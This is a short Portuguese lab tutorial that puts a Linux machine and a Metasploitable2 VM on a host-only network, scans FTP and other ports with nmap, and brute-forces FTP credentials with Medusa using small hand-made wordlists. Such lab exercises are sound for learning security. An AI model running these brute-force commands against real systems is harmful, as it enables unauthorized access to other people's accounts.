## Primeiro passo: 

Precisaremos incluir as duas maquinas na mesma rede (Linux e metaploistable2).

- No menu "configurações" > Rede > "ligado a" iremos escolher a opção "host only" em ambas as maquinas.

![Python](imagens/img23.png)


Para identificar o ip da maquina irá utilizar o script "ip a"
O ip que deseja localizar irá visualuzar no campo "inet"
Para certificarse que as maquinas estão na mesma rede utilize o script " ping -C 3 IP"
image
**Simulação FTP **

Para enumerar as portas abertas iremos utilizar o Nmap = nmap -sV -p 21,22,80,445,139,IP

image
Para conectar ao ftp aberto ira utilizar = ftp Ip

image
Ataque de força bruta utilizando Medusa

Para criar listas com opções de usuarios utilize = echo -e "user\nmsfadmin\nadmin\nroot" > user. txt (será criado um arquivo txt com os usuarios user\nmsfadmin\nadmin\nroot)

Para criar listas com opções de senhas utilize = echo -e "123456\npassword\nqwerty\nmsfadmin" > pass. txt (será criado um arquivo txt com as senhas "123456\npassword\nqwerty\nmsfadmin")

Após criar as listas com possiveis usuarios e senhas irá iniciar o ataque utilizando o medusa:

medusa -h 192.168.56.104 -U user.txt -P pass.txt -M ftp -t 6

Se uma das combinações darem certo, irá retornar "sucess" no usuario e senha corrretos

image
Ao tentar conectar novamente no ftp com o script "ftp Ip" e incluir as senhas que descobriu, conseguirá acessar com sucesso:

image